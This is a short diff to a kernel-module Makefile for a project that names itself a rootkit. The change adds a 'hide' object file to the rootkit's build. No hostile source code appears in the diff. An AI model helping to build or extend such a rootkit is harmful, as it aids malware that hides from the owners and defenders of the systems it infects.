@@ -17,7 +17,7 @@ RELEASE_DIR := dist
 obj-m += $(ROOTKIT_DIR)/$(ROOTKIT).o
 
 # Core
-$(ROOTKIT)-y += $(ROOTKIT_DIR)/core.o $(ROOTKIT_DIR)/init.o
+$(ROOTKIT)-y += $(ROOTKIT_DIR)/core.o $(ROOTKIT_DIR)/init.o $(ROOTKIT_DIR)/hide.o
 
 # Flags
 ccflags-y += -I$(PWD)/include
